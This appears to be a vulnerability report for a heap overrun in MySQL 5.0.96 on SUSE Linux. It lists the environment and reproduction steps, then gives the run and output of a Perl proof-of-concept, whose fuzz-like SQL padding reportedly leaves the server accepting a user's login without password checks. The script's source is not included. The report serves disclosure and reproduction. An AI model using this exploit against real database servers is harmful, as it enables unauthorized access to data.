Hardware: X86-64
OS: SLES 11 SP2 + update
Mysql: 
mysql  Ver 14.12 Distrib 5.0.96, for suse-linux-gnu (x86_64) using  EditLine
wrapper

[Reproduction Steps]
1, Install mysql( zypper in mysql) and a Perl module:
perl -MCPAN -e 'install Net::MySQL'

2, Create a mysql user:
mysql> CREATE USER 'user'@'localhost' IDENTIFIED BY 'test';

3, run the POC exp:
shawn@linux-7kz0:~> perl mysql_heapoverrun.pl 
AAAA..AASE dUAAAA..AAE dUSAAAA..AA dUSEAAAA..AAdUSE AAAA..AAAAAA..AAHOW TABLES
FROM dSAAAA..AAOW TABLES FROM dSHAAAA..AAW TABLES FROM dSHOAAAA..AA TABLES FROM
dSHOWAAAA..AATABLES FROM dSHOW AAAA..AAABLES FROM dSHOW TAAAA..AABLES FROM
dSHOW TAAAAA..AALES FROM dSHOW TABAAAA..AAES FROM dSHOW TABLAAAA..AAS FROM
dSHOW TABLEAAAA..AA FROM dSHOW TABLESAAAA..AAFROM dSHOW TABLES AAAA..AAROM
dSHOW TABLES FAAAA..AAOM dSHOW TABLES FRAAAA..AAM dSHOW TABLES FROAAAA..AA
dSHOW TABLES FROMAAAA..AAdSHOW TABLES FROM AAAA..AAAAAA..AAESCRIBE
tDAAAA..AASCRIBE tDEAAAA..AACRIBE tDESAAAA..AARIBE tDESCAAAA..AAIBE
tDESCRAAAA..AABE tDESCRIAAAA..AAE tDESCRIBAAAA..AA tDESCRIBEAAAA..AAtDESCRIBE
AAAA..AAAAAA..AAHOW FIELDS FROM tSAAAA..AAOW FIELDS FROM tSHAAAA..AAW FIELDS
FROM tSHOAAAA..AA FIELDS FROM tSHOWAAAA..AAFIELDS FROM tSHOW AAAA..AAIELDS FROM
tSHOW FAAAA..AAELDS FROM tSHOW FIAAAA..AALDS FROM tSHOW FIEAAAA..AADS FROM
tSHOW FIELAAAA..AAS FROM tSHOW FIELDAAAA..AA FROM tSHOW FIELDSAAAA..AAFROM
tSHOW FIELDS AAAA..AAROM tSHOW FIELDS FAAAA..AAOM tSHOW FIELDS FRAAAA..AAM
tSHOW FIELDS FROAAAA..AA tSHOW FIELDS FROMAAAA..AAtSHOW FIELDS FROM
AAAA..AAAAAA..AAHOW COLUMNS FROM tSAAAA..AAOW COLUMNS FROM tSHAAAA..AAW COLUMNS
FROM tSHOAAAA..AA COLUMNS FROM tSHOWAAAA..AACOLUMNS FROM tSHOW AAAA..AAOLUMNS
FROM tSHOW CAAAA..AALUMNS FROM tSHOW COAAAA..AAUMNS FROM tSHOW COLAAAA..AAMNS
FROM tSHOW COLUAAAA..AANS FROM tSHOW COLUMAAAA..AAS FROM tSHOW COLUMNAAAA..AA
FROM tSHOW COLUMNSAAAA..AAFROM tSHOW COLUMNS AAAA..AAROM tSHOW COLUMNS
FAAAA..AAOM tSHOW COLUMNS FRAAAA..AAM tSHOW COLUMNS FROAAAA..AA tSHOW COLUMNS
FROMAAAA..AAtSHOW COLUMNS FROM AAAA..AAAAAA..AAHOW INDEX FROM tSAAAA..AAOW
INDEX FROM tSHAAAA..AAW INDEX FROM tSHOAAAA..AA INDEX FROM tSHOWAAAA..AAINDEX
FROM tSHOW AAAA..AANDEX FROM tSHOW IAAAA..AADEX FROM tSHOW INAAAA..AAEX FROM
tSHOW INDAAAA..AAX FROM tSHOW INDEAAAA..AA FROM tSHOW INDEXAAAA..AAFROM tSHOW
INDEX AAAA..AAROM tSHOW INDEX FAAAA..AAOM tSHOW INDEX FRAAAA..AAM tSHOW INDEX
FROAAAA..AA tSHOW INDEX FROMAAAA..AAtSHOW INDEX FROM AAAA..AAAAAA..AAREATE
TABLE table_name (c CHAR(1))CAAAA..AAEATE TABLE table_name (c
CHAR(1))CRAAAA..AAATE TABLE table_name (c CHAR(1))CREAAAA..AATE TABLE
table_name (c CHAR(1))CREAAAAA..AAE TABLE table_name (c CHAR(1))CREATAAAA..AA
TABLE table_name (c CHAR(1))CREATEAAAA..AATABLE table_name (c CHAR(1))CREATE
AAAA..AAABLE table_name (c CHAR(1))CREATE TAAAA..AABLE table_name (c
CHAR(1))CREATE TAAAAA..AALE table_name (c CHAR(1))CREATE TABAAAA..AAE
table_name (c CHAR(1))CREATE TABLAAAA..AA table_name (c CHAR(1))CREATE
TABLEAAAA..AAtable_name (c CHAR(1))CREATE TABLE AAAA..AAable_name (c
CHAR(1))CREATE TABLE tAAAA..AAble_name (c CHAR(1))CREATE TABLE
taAAAA..AAle_name (c CHAR(1))CREATE TABLE tabAAAA..AAe_name (c CHAR(1))CREATE
TABLE tablAAAA..AA_name (c CHAR(1))CREATE TABLE tableAAAA..AAname (c
CHAR(1))CREATE TABLE table_AAAA..AAame (c CHAR(1))CREATE TABLE
table_nAAAA..AAme (c CHAR(1))CREATE TABLE table_naAAAA..AAe (c CHAR(1))CREATE
TABLE table_namAAAA..AA (c CHAR(1))CREATE TABLE table_nameAAAA..AA(c
CHAR(1))CREATE TABLE table_name AAAA..AAc CHAR(1))CREATE TABLE table_name
(AAAA..AA CHAR(1))CREATE TABLE table_name (cAAAA..AACHAR(1))CREATE TABLE
table_name (c AAAA..AAHAR(1))CREATE TABLE table_name (c CAAAA..AAAR(1))CREATE
TABLE table_name (c CHAAAA..AAR(1))CREATE TABLE table_name (c
CHAAAAA..AA(1))CREATE TABLE table_name (c CHARAAAA..AA1))CREATE TABLE
table_name (c CHAR(AAAA..AA))CREATE TABLE table_name (c CHAR(1AAAA..AA)CREATE
TABLE table_name (c CHAR(1)AAAA..AAAAAA..AAROP TABLE tDAAAA..AAOP TABLE
tDRAAAA..AAP TABLE tDROAAAA..AA TABLE tDROPAAAA..AATABLE tDROP AAAA..AAABLE
tDROP TAAAA..AABLE tDROP TAAAAA..AALE tDROP TABAAAA..AAE tDROP TABLAAAA..AA
tDROP TABLEAAAA..AAtDROP TABLE AAAA..AAAAAA..AALTER TABLE t DROP cAAAAA..AATER
TABLE t DROP cALAAAA..AAER TABLE t DROP cALTAAAA..AAR TABLE t DROP
cALTEAAAA..AA TABLE t DROP cALTERAAAA..AATABLE t DROP cALTER AAAA..AAABLE t
DROP cALTER TAAAA..AABLE t DROP cALTER TAAAAA..AALE t DROP cALTER TABAAAA..AAE
t DROP cALTER TABLAAAA..AA t DROP cALTER TABLEAAAA..AAt DROP cALTER TABLE
AAAA..AA DROP cALTER TABLE tAAAA..AADROP cALTER TABLE t AAAA..AAROP cALTER
TABLE t DAAAA..AAOP cALTER TABLE t DRAAAA..AAP cALTER TABLE t DROAAAA..AA
cALTER TABLE t DROPAAAA..AAcALTER TABLE t DROP AAAA..AAAAAA..AAELETE FROM t
WHERE 1=1DAAAA..AALETE FROM t WHERE 1=1DEAAAA..AAETE FROM t WHERE
1=1DELAAAA..AATE FROM t WHERE 1=1DELEAAAA..AAE FROM t WHERE 1=1DELETAAAA..AA
FROM t WHERE 1=1DELETEAAAA..AAFROM t WHERE 1=1DELETE AAAA..AAROM t WHERE
1=1DELETE FAAAA..AAOM t WHERE 1=1DELETE FRAAAA..AAM t WHERE 1=1DELETE
FROAAAA..AA t WHERE 1=1DELETE FROMAAAA..AAt WHERE 1=1DELETE FROM AAAA..AA WHERE
1=1DELETE FROM tAAAA..AAWHERE 1=1DELETE FROM t AAAA..AAHERE 1=1DELETE FROM t
WAAAA..AAERE 1=1DELETE FROM t WHAAAA..AARE 1=1DELETE FROM t WHEAAAA..AAE
1=1DELETE FROM t WHERAAAA..AA 1=1DELETE FROM t WHEREAAAA..AA1=1DELETE FROM t
WHERE AAAA..AA=1DELETE FROM t WHERE 1AAAA..AA1DELETE FROM t WHERE
1=AAAA..AAAAAA..AAPDATE t SET a=aUAAAA..AADATE t SET a=aUPAAAA..AAATE t SET
a=aUPDAAAA..AATE t SET a=aUPDAAAAA..AAE t SET a=aUPDATAAAA..AA t SET
a=aUPDATEAAAA..AAt SET a=aUPDATE AAAA..AA SET a=aUPDATE tAAAA..AASET a=aUPDATE
t AAAA..AAET a=aUPDATE t SAAAA..AAT a=aUPDATE t SEAAAA..AA a=aUPDATE t
SETAAAA..AAa=aUPDATE t SET AAAA..AA=aUPDATE t SET aAAAA..AAaUPDATE t SET
a=AAAA..AAAAAA..AAET PASSWORD=PASSWORD('p')SAAAA..AAT
PASSWORD=PASSWORD('p')SEAAAA..AA
PASSWORD=PASSWORD('p')SETAAAA..AAPASSWORD=PASSWORD('p')SET
AAAA..AAASSWORD=PASSWORD('p')SET PAAAA..AASSWORD=PASSWORD('p')SET
PAAAAA..AASWORD=PASSWORD('p')SET PASAAAA..AAWORD=PASSWORD('p')SET
PASSAAAA..AAORD=PASSWORD('p')SET PASSWAAAA..AARD=PASSWORD('p')SET
PASSWOAAAA..AAD=PASSWORD('p')SET PASSWORAAAA..AA=PASSWORD('p')SET
PASSWORDAAAA..AAPASSWORD('p')SET PASSWORD=AAAA..AAASSWORD('p')SET
PASSWORD=PAAAA..AASSWORD('p')SET PASSWORD=PAAAAA..AASWORD('p')SET
PASSWORD=PASAAAA..AAWORD('p')SET PASSWORD=PASSAAAA..AAORD('p')SET
PASSWORD=PASSWAAAA..AARD('p')SET PASSWORD=PASSWOAAAA..AAD('p')SET
PASSWORD=PASSWORAAAA..AA('p')SET PASSWORD=PASSWORDAAAA..AA'p')SET
PASSWORD=PASSWORD(AAAA..AAp')SET PASSWORD=PASSWORD('AAAA..AA')SET
PASSWORD=PASSWORD('pAAAA..AA)SET
PASSWORD=PASSWORD('p'AAAA..AAshawn@linux-7kz0:~> 

[Actual Result]  
Boom...check the current users:

mysql> select user();
+-----------------+
| user()          |
+-----------------+
| shawn@localhost | 
+-----------------+
1 row in set (0.00 sec)

mysql> CREATE USER 'user'@'localhost' IDENTIFIED BY 'test';
ERROR 1227 (42000): Access denied; you need the CREATE USER privilege for this
operation

Right now, the user "shawn" doesn't need pw auth to access the mysql server.

shawn@linux-7kz0:~> mysql -h 127.0.0.1 -u user -p
Enter password: 
ERROR 1045 (28000): Access denied for user 'user'@'localhost' (using password:
YES)
shawn@linux-7kz0:~> mysql -h 127.0.0.1 -u shawn -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 5.0.96 SUSE MySQL RPM

Copyright (c) 2000, 2011, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> select user();
+-----------------+
| user()          |
+-----------------+
| shawn@localhost | 
+-----------------+
1 row in set (0.00 sec)

mysql> exit
Bye
